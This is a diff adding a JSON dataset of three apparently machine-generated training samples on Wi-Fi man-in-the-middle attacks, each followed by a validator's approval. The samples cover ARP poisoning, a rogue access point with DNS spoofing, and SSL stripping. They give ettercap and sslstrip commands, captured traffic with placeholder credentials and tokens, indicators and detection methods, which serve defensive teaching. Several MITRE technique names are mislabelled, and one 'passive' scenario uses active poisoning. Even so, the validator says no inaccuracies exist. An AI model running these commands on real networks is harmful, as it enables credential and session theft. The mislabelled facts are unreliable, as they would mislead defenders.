@@ -1,0 +1,183 @@
+{
+  "report": [
+    {
+      "index": 0,
+      "problem": {
+        "area": "Man-in-the-Middle (MITM) Attack",
+        "nature": "wifi_eavesdropping"
+      },
+      "example": {
+        "scenario": "Passive Wi-Fi Eavesdropping via MITM on Public Cafe Network Capturing HTTP Basic Auth Credentials",
+        "technical_data": {
+          "packet_capture_excerpt": [
+            "Frame 1234: 151 bytes on wire (1208 bits), 151 bytes captured (1208 bits)",
+            "Ethernet II, Src: 02:42:ac:11:00:02, Dst: 08:00:27:73:8b:af",
+            "Internet Protocol Version 4, Src: 192.168.1.101, Dst: 104.26.10.78",
+            "Transmission Control Protocol, Src Port: 49231, Dst Port: 80, Seq: 1, Ack: 1",
+            "Hypertext Transfer Protocol",
+            "    GET /login HTTP/1.1",
+            "    Host: example-insecure.com",
+            "    Authorization: Basic dXNlcjpwYXNzd29yZA==",
+            "    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "    Accept: text/html,application/xhtml+xml",
+            "    Cookie: PHPSESSID=8a7f5e9c1d2b3f4",
+            "    Connection: keep-alive"
+          ],
+          "http_header_capture": "GET /login HTTP/1.1\r\nHost: example-insecure.com\r\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: text/html,application/xhtml+xml\r\nCookie: PHPSESSID=8a7f5e9c1d2b3f4\r\nConnection: keep-alive\r\n\r\n",
+          "decoded_auth_header": "user:password",
+          "mitm_tool_command": "ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1/ /192.168.1.101/",
+          "arp_poisoning_log": [
+            "[2024-05-15 14:22:33] ARP poisoning started between 192.168.1.1 and 192.168.1.101",
+            "[2024-05-15 14:23:05] Captured HTTP Basic Auth header: dXNlcjpwYXNzd29yZA== (user:password)"
+          ],
+          "wifi_ap_list": [
+            {
+              "SSID": "FreePublicWiFi",
+              "BSSID": "02:42:ac:11:00:02",
+              "Channel": 6,
+              "Encryption": "Open"
+            }
+          ],
+          "system_log_snippet": [
+            "May 15 14:22:30 host kernel: device wlan0 entered promiscuous mode",
+            "May 15 14:22:33 host ettercap[4521]: Starting ARP poisoning..."
+          ]
+        },
+        "indicators": [
+          "ARP poisoning packets with spoofed MAC addresses",
+          "HTTP requests containing Authorization: Basic headers over unencrypted HTTP",
+          "Presence of unencrypted cookies (PHPSESSID) in HTTP traffic",
+          "Promiscuous mode enabled on Wi-Fi interface",
+          "Wi-Fi network with open authentication (no WPA/WPA2)"
+        ],
+        "detection_method": "Network IDS configured to detect ARP poisoning packets and unusual HTTP Basic Auth headers over port 80; Endpoint monitoring for promiscuous mode on interfaces; User education alerts about connecting to open Wi-Fi",
+        "relevant_mitre_techniques": [
+          "T1557.001 - Man-in-the-Middle: ARP Spoofing",
+          "T1040 - Network Sniffing",
+          "T1071.001 - Application Layer Protocol: Web Protocols"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a Man-in-the-Middle (MITM) attack involving Wi-Fi eavesdropping on an open public network. The scenario clearly describes passive interception of unencrypted HTTP traffic, capturing sensitive data such as HTTP Basic Auth credentials and session cookies, which aligns well with the problem nature. The technical data is detailed and realistic, including packet capture excerpts, decoded credentials, ARP poisoning commands and logs, Wi-Fi access point details, and system logs indicating promiscuous mode and ARP poisoning activity. The indicators effectively highlight key signs of the attack, such as ARP poisoning, unencrypted HTTP Basic Auth headers, presence of cookies in cleartext, promiscuous mode, and open Wi-Fi network. Detection methods and relevant MITRE ATT&CK techniques are appropriately included, enhancing completeness. Overall, the sample is comprehensive, plausible, and well-structured, making it a strong representation of the stated cybersecurity problem. No missing fields or inaccuracies were found."
+      }
+    },
+    {
+      "index": 1,
+      "problem": {
+        "area": "Man-in-the-Middle (MITM) Attack",
+        "nature": "wifi_eavesdropping"
+      },
+      "example": {
+        "scenario": "Active MITM Attack Using Rogue Wi-Fi Access Point Capturing Session Cookies via HTTP Downgrade",
+        "technical_data": {
+          "rogue_ap_config": {
+            "SSID": "Airport_Free_WiFi",
+            "BSSID": "de:ad:be:ef:00:01",
+            "Channel": 11,
+            "Encryption": "Open",
+            "DHCP_range": "192.168.50.100-192.168.50.200",
+            "DNS Spoofing": "Enabled"
+          },
+          "dns_spoof_log": [
+            "[2024-05-20 11:45:12] Intercepted DNS query: www.securebank.com A",
+            "[2024-05-20 11:45:12] Responded with spoofed IP: 192.168.50.1"
+          ],
+          "http_response_modification": "Replaced HTTPS links with HTTP in intercepted HTML payload",
+          "captured_http_request": "POST /login HTTP/1.1\r\nHost: www.securebank.com\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: sessionid=4f3a2b7c9d1e6f8a\r\nContent-Length: 40\r\n\r\nusername=john.doe&password=SuperSecret123!",
+          "mitm_proxy_log": [
+            "2024-05-20 11:45:15 - Received POST /login with credentials: username=john.doe, password=SuperSecret123!",
+            "Session Cookie: sessionid=4f3a2b7c9d1e6f8a"
+          ],
+          "tcpdump_http_traffic_snippet": [
+            "11:45:15.123456 IP 192.168.50.101.56789 > 192.168.50.1.80: Flags [P.], seq 1234:1274, ack 5678, win 512",
+            "POST /login HTTP/1.1",
+            "Host: www.securebank.com",
+            "Cookie: sessionid=4f3a2b7c9d1e6f8a",
+            "Content-Type: application/x-www-form-urlencoded",
+            "",
+            "username=john.doe&password=SuperSecret123!"
+          ],
+          "hostapd_wpa_supplicant_log": [
+            "wlan0: AP-STA-CONNECTED de:ad:be:ef:aa:bb",
+            "wlan0: STA de:ad:be:ef:aa:bb WPA: group key handshake completed"
+          ]
+        },
+        "indicators": [
+          "Rogue Wi-Fi SSID identical or similar to legitimate hotspot",
+          "DNS responses with private IP (192.168.50.1) for legitimate domains",
+          "HTTP traffic containing sensitive POST data normally expected over HTTPS",
+          "Session cookies transmitted over HTTP",
+          "Hostapd logs showing new STA connections to rogue AP"
+        ],
+        "detection_method": "Network monitoring for rogue APs with conflicting SSIDs; DNS query anomaly detection; Analysis of HTTP vs HTTPS traffic discrepancies; Endpoint alerts on unexpected Wi-Fi networks and unencrypted credentials transmission",
+        "relevant_mitre_techniques": [
+          "T1557.003 - Man-in-the-Middle: Rogue Access Point",
+          "T1572 - Protocol Tunneling (DNS Manipulation)",
+          "T1071.001 - Application Layer Protocol: Web Protocols"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a Man-in-the-Middle (MITM) attack via wifi_eavesdropping. It details a realistic scenario where an attacker sets up a rogue open Wi-Fi access point mimicking a legitimate hotspot, enabling DNS spoofing and HTTP downgrade attacks to intercept sensitive data such as login credentials and session cookies. All required fields are present and well populated, including technical data logs (rogue AP config, DNS spoofing logs, HTTP request captures, proxy logs, tcpdump snippets, and hostapd logs) that clearly illustrate the attack mechanics. The indicators section effectively highlights key signs of this attack type, such as rogue SSID similarity, DNS responses redirecting to private IPs, unencrypted sensitive HTTP traffic, and new client connections to the rogue AP. The detection methods and relevant MITRE techniques align well with the described attack. Overall, the sample is comprehensive, realistic, and correctly aligned with the problem nature. For improvement, consider explicitly mentioning user education or VPN usage in the detection or mitigation notes to fully reflect the risk reduction strategies stated in the problem description."
+      }
+    },
+    {
+      "index": 2,
+      "problem": {
+        "area": "Man-in-the-Middle (MITM) Attack",
+        "nature": "wifi_eavesdropping"
+      },
+      "example": {
+        "scenario": "Wi-Fi Eavesdropping via MITM Using SSLStrip to Downgrade HTTPS to HTTP and Capture Session Tokens",
+        "technical_data": {
+          "sslstrip_setup_command": "sslstrip -l 8080",
+          "ettercap_arp_poisoning_command": "ettercap -T -q -i wlan0 -M arp:remote /192.168.0.1/ /192.168.0.102/",
+          "captured_http_request": "GET /dashboard HTTP/1.1\r\nHost: secure-portal.com\r\nCookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n\r\n",
+          "sslstrip_http_response": "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 4532\r\n\r\n<html><head><title>Secure Portal</title><script src=\"http://insecurecdn.com/script.js\"></script></head><body>...</body></html>",
+          "wireshark_tcp_stream": [
+            "Frame 2156: 230 bytes on wire (1840 bits), 230 bytes captured",
+            "Ethernet II, Src: 00:1a:2b:3c:4d:5e, Dst: ff:ff:ff:ff:ff:ff",
+            "Internet Protocol Version 4, Src: 192.168.0.102, Dst: 93.184.216.34",
+            "Transmission Control Protocol, Src Port: 54321, Dst Port: 80",
+            "Hypertext Transfer Protocol",
+            "    GET /dashboard HTTP/1.1",
+            "    Host: secure-portal.com",
+            "    Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwiaWF0IjoxNjIyMjY3MjAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+            "    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "    Accept: text/html",
+            "    Connection: keep-alive"
+          ],
+          "auth_token_decoded_payload": {
+            "sub": "1234567890",
+            "iat": 1622267200
+          },
+          "system_log": [
+            "May 22 10:15:23 host ettercap[5123]: ARP poisoning started between 192.168.0.1 and 192.168.0.102",
+            "May 22 10:15:30 host sslstrip[5200]: SSLStrip proxy listening on port 8080"
+          ]
+        },
+        "indicators": [
+          "HTTP traffic containing JWT or session tokens normally sent over HTTPS",
+          "Presence of sslstrip process and arp poisoning activity",
+          "Downgrade of HTTPS traffic to HTTP, visible in captured traffic",
+          "Injection of insecure scripts or references in HTTP responses",
+          "ARP poisoning detected via network monitoring"
+        ],
+        "detection_method": "Network IDS signatures for ARP spoofing and sslstrip tool behavior; HTTP traffic analysis for session tokens transmitted in cleartext; Endpoint detection of unusual proxy processes and network interface promiscuity; TLS certificate and HSTS failure monitoring",
+        "relevant_mitre_techniques": [
+          "T1557.001 - Man-in-the-Middle: ARP Spoofing",
+          "T1573.001 - Encrypted Channel: SSL/TLS Proxy",
+          "T1071.001 - Application Layer Protocol: Web Protocols"
+        ]
+      },
+      "validation": {
+        "valid": true,
+        "issues": [],
+        "comments": "The sample accurately represents a Man-in-the-Middle (MITM) attack focused on wifi_eavesdropping by demonstrating the use of ARP poisoning and sslstrip to downgrade HTTPS traffic to HTTP, thereby capturing sensitive session tokens. The scenario is realistic and plausible in real-world public or unsecured Wi-Fi environments. All required fields are present and well populated, including detailed technical data such as commands used, captured traffic, decoded tokens, and system logs. The indicators clearly explain why this sample matches the problem, highlighting key signs like HTTP traffic carrying JWT tokens, presence of sslstrip and ARP poisoning, and insecure script injection. The detection methods and relevant MITRE techniques are appropriate and comprehensive. Overall, the sample is complete, correct, and provides a strong educational example of the described cybersecurity problem."
+      }
+    }
+  ]
+}
